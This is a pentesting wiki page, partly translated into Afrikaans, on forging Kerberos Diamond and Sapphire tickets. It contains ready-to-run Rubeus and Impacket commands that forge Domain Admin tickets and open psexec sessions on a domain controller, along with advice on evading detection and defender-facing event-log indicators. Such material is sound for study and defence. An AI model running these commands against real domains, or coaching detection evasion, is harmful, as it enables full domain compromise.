# Diamond Ticket

{{#include ../../banners/hacktricks-training.md}}

## Diamond Ticket

**Like a golden ticket**, a diamond ticket is a TGT which can be used to **access any service as any user**. A golden ticket is forged completely offline, encrypted with the krbtgt hash of that domain, and then passed into a logon session for use. Because domain controllers don't track TGTs it (or they) have legitimately issued, they will happily accept TGTs that are encrypted with its own krbtgt hash.

There are two common techniques to detect the use of golden tickets:

- Kyk vir TGS-REQs wat geen ooreenstemmende AS-REQ het nie.
- Kyk vir TGTs met onredelike waardes, soos Mimikatz se verstek 10-jaar leeftyd.

A **diamond ticket** is made by **modifying the fields of a legitimate TGT that was issued by a DC**. This is achieved by **requesting** a **TGT**, **decrypting** it with the domain's krbtgt hash, **modifying** the desired fields of the ticket, then **re-encrypting it**. This **overcomes the two aforementioned shortcomings** of a golden ticket because:

- TGS-REQs will have a preceding AS-REQ.
- The TGT was issued by a DC which means it will have all the correct details from the domain's Kerberos policy. Even though these can be accurately forged in a golden ticket, it's more complex and open to mistakes.

### Vereistes & werkvloei

- **Cryptographic material**: the krbtgt AES256 key (preferred) or NTLM hash in order to decrypt and re-sign the TGT.
- **Legitimate TGT blob**: obtained with `/tgtdeleg`, `asktgt`, `s4u`, or by exporting tickets from memory.
- **Context data**: the target user RID, group RIDs/SIDs, and (optionally) LDAP-derived PAC attributes.
- **Service keys** (only if you plan to re-cut service tickets): AES key of the service SPN to be impersonated.

1. Verkry 'n TGT vir enige beheer­de gebruiker via AS-REQ (Rubeus `/tgtdeleg` is handig omdat dit die kliënt dwing om die Kerberos GSS-API-dans sonder kredensiale uit te voer).
2. Dekripteer die teruggegewe TGT met die krbtgt-sleutel, en plaas PAC-attribuute (gebruiker, groepe, aanmeldinligting, SIDs, toestelclaims, ens.) by.
3. Her-enkripteer/onderteken die ticket met dieselfde krbtgt-sleutel en injekteer dit in die huidige aanmeldsessie (`kerberos::ptt`, `Rubeus.exe ptt`...).
4. Opsioneel, herhaal die proses oor 'n service ticket deur 'n geldige TGT blob plus die teikenservice-sleutel te voorsien om op die draad stil te bly.

### Opgedateerde Rubeus tradecraft (2024+)

Onlangse werk deur Huntress het die `diamond` action binne Rubeus gemoderniseer deur die `/ldap` en `/opsec` verbeterings oor te dra wat voorheen net vir golden/silver tickets bestaan het. `/ldap` trek nou werklike PAC-konteks deur LDAP te bevraagteken **en** SYSVOL te mount om rekening-/groep-attribuute plus Kerberos/password policy uit te haal (bv. `GptTmpl.inf`), terwyl `/opsec` die AS-REQ/AS-REP vloei laat ooreenstem met Windows deur die twee-stap preauth-uitruiling te doen en AES-only + realistiese KDCOptions af te dwing. Dit verminder dramaties voor die hand liggende indikators soos ontbrekende PAC-velde of beleid-misgematchte leeftye.
```powershell
# Query RID/context data (PowerView/SharpView/AD modules all work)
Get-DomainUser -Identity <username> -Properties objectsid | Select-Object samaccountname,objectsid

# Craft a high-fidelity diamond TGT and inject it
./Rubeus.exe diamond /tgtdeleg \
/ticketuser:svc_sql /ticketuserid:1109 \
/groups:512,519 \
/krbkey:<KRBTGT_AES256_KEY> \
/ldap /ldapuser:MARVEL\loki /ldappassword:Mischief$ \
/opsec /nowrap
```
- `/ldap` (met opsionele `/ldapuser` & `/ldappassword`) maak navrae op AD en SYSVOL om die teiken-gebruiker se PAC-beleidsdata te weerspieël.
- `/opsec` dwing 'n Windows-like AS-REQ retry af, stel lawaaierige flags op nul en hou by AES256.
- `/tgtdeleg` hou jou hande weg van die cleartext password of NTLM/AES key van die slagoffer, terwyl dit steeds 'n ontsleutelbare TGT teruggee.

### Service-ticket hersnying

Dieselfde Rubeus-refresh het die vermoë bygevoeg om die diamond technique op TGS blobs toe te pas. Deur `diamond` 'n **base64-encoded TGT** (van `asktgt`, `/tgtdeleg`, of 'n voorheen vervalste TGT), die **service SPN**, en die **service AES key** te voorsien, kan jy realistiese service tickets skep sonder om die KDC aan te raak — effektief 'n minder opvallende silver ticket.
```powershell
./Rubeus.exe diamond \
/ticket:<BASE64_TGT_OR_KRB-CRED> \
/service:cifs/dc01.lab.local \
/servicekey:<AES256_SERVICE_KEY> \
/ticketuser:svc_sql /ticketuserid:1109 \
/ldap /opsec /nowrap
```
Hierdie werkvloei is ideaal wanneer jy reeds 'n diensrekening-sleutel beheer (bv. gedump met `lsadump::lsa /inject` of `secretsdump.py`) en 'n eenmalige TGS wil maak wat perfek ooreenstem met AD-beleid, tydlyne en PAC-data sonder om enige nuwe AS/TGS-verkeer uit te stuur.

### Sapphire-style PAC swaps (2025)

Een nuwer variasie, soms 'n **sapphire ticket** genoem, kombineer Diamond se "real TGT" basis met **S4U2self+U2U** om 'n geprivilegieerde PAC te steel en dit in jou eie TGT te plaas. In plaas van om ekstra SIDs uit te dink, versoek jy 'n U2U S4U2self ticket vir 'n gebruiker met hoë voorregte waar die `sname` op die lae-voorreg-versoeker mik; die KRB_TGS_REQ dra die versoeker se TGT in `additional-tickets` en stel `ENC-TKT-IN-SKEY`, wat toelaat dat die service ticket met daardie gebruiker se sleutel ontsyfer kan word. Jy onttrek dan die geprivilegieerde PAC en sny dit in jou wettige TGT voordat jy weer teken met die krbtgt sleutel.

Impacket se `ticketer.py` bevat nou sapphire ondersteuning via `-impersonate` + `-request` (regstreekse KDC-uitruiling):
```bash
python3 ticketer.py -request -impersonate 'DAuser' \
-domain 'lab.local' -user 'lowpriv' -password 'Passw0rd!' \
-aesKey '<krbtgt_aes256>' -domain-sid 'S-1-5-21-111-222-333'
# inject resulting .ccache
export KRB5CCNAME=lowpriv.ccache
python3 psexec.py lab.local/DAuser@dc.lab.local -k -no-pass
```
- `-impersonate` aanvaar 'n gebruikersnaam of SID; `-request` benodig regstreekse gebruikerscreds plus krbtgt sleutelmateriaal (AES/NTLM) om tickets te dekripteer/patch.

Belangrike OPSEC-aanwysers wanneer hierdie variant gebruik word:

- TGS-REQ sal `ENC-TKT-IN-SKEY` en `additional-tickets` (die slagoffer TGT) dra — skaars in normale verkeer.
- `sname` is dikwels gelyk aan die versoekende gebruiker (self-service toegang) en Event ID 4769 wys die aanroeper en teiken as dieselfde SPN/gebruiker.
- Verwag gepaarde 4768/4769 inskrywings met dieselfde kliëntrekenaar maar verskillende CNAMES (laag-priv versoeker vs. bevoorregte PAC-eienaar).

### OPSEC & detection notes

- Die tradisionele hunter heuristieke (TGS sonder AS, dekade-lange leeftye) geld steeds vir golden tickets, maar diamond tickets kom hoofsaaklik na vore wanneer die **PAC-inhoud of groepskartering onmoontlik lyk**. Vul elke PAC-veld in (logon hours, user profile paths, device IDs) sodat geoutomatiseerde vergelykings nie onmiddellik die vervalsing vlag nie.
- **Moet nie groepe/RIDs oorskry nie**. As jy net `512` (Domain Admins) en `519` (Enterprise Admins) benodig, hou dit daar en maak seker dat die teikenrekening geloofwaardig elders in AD aan daardie groepe behoort. Oormatige `ExtraSids` is 'n wenk.
- Sapphire-style swaps laat U2U-vingerafdrukke agter: `ENC-TKT-IN-SKEY` + `additional-tickets` plus 'n `sname` wat na 'n gebruiker wys (dikwels die versoeker) in 4769, en 'n opvolg 4624 aanmelding wat van die vervalste ticket afkomstig is. Korreleer daardie velde in plaas van net te soek na no-AS-REQ gaps.
- Microsoft het begin om **RC4 service ticket issuance** uit te faseer weens CVE-2026-20833; die afdwing van AES-only etypes op die KDC verhard beide die domein en bring dit in lyn met diamond/sapphire tooling (/opsec dwing reeds AES af). Die meng van RC4 in vervalste PACs sal toenemend uitstaan.
- Splunk's Security Content project versprei attack-range telemetry vir diamond tickets plus detections soos *Windows Domain Admin Impersonation Indicator*, wat ongebruiklike Event ID 4768/4769/4624 reekse en PAC-groepe-wyses korreleer. Die herspeling van daardie dataset (of die generering van jou eie met die opdragte hierbo) help om SOC-dekking vir T1558.001 te valideer en gee jou konkrete alert-logika om te ontduik.

## References

- [Palo Alto Unit 42 – Precious Gemstones: The New Generation of Kerberos Attacks (2022)](https://unit42.paloaltonetworks.com/next-gen-kerberos-attacks/)
- [Core Security – Impacket: We Love Playing Tickets (2023)](https://www.coresecurity.com/core-labs/articles/impacket-we-love-playing-tickets)
- [Huntress – Recutting the Kerberos Diamond Ticket (2025)](https://www.huntress.com/blog/recutting-the-kerberos-diamond-ticket)
- [Splunk Security Content – Diamond Ticket attack data & detections (2023)](https://research.splunk.com/attack_data/be469518-9d2d-4ebb-b839-12683cd18a7c/)
- [Хабр – Теневая сторона драгоценностей: Diamond & Sapphire Ticket (2025)](https://habr.com/ru/articles/891620/)
- [Microsoft – RC4 service ticket enforcement for CVE-2026-20833](https://support.microsoft.com/en-us/topic/how-to-manage-kerberos-kdc-usage-of-rc4-for-service-account-ticket-issuance-changes-related-to-cve-2026-20833-1ebcda33-720a-4da8-93c1-b0496e1910dc)

{{#include ../../banners/hacktricks-training.md}}
